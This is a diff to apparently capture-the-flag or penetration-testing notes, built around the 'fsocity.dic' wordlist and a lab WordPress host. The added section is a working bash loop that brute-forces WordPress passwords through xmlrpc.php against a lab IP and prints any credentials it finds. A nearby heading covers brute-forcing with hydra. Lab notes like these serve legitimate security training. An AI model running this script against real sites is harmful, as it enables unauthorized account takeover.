@@ -14,6 +14,12 @@ wc -l fsocity.dic # number of lines
 sort fsocity.dic | uniq | wc -l # unique words
 sort fsocity.dic | uniq > example_filtered.txt
 ```
+### A LOTL attack 
+```bash
+username="admin"
+password="password"
+for pass in $(cat passwords.txt); do curl -s -X POST -d "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$username</value></param><param><value>$pass</value></param></params></methodCall>" http://10.10.6.115/xmlrpc.php | grep -q 'Incorrect username or password.' || echo "Found credentials: $username:$pass"; done
+```
 ### How to bruteforce input fields with hydra
 Username
 ```bash
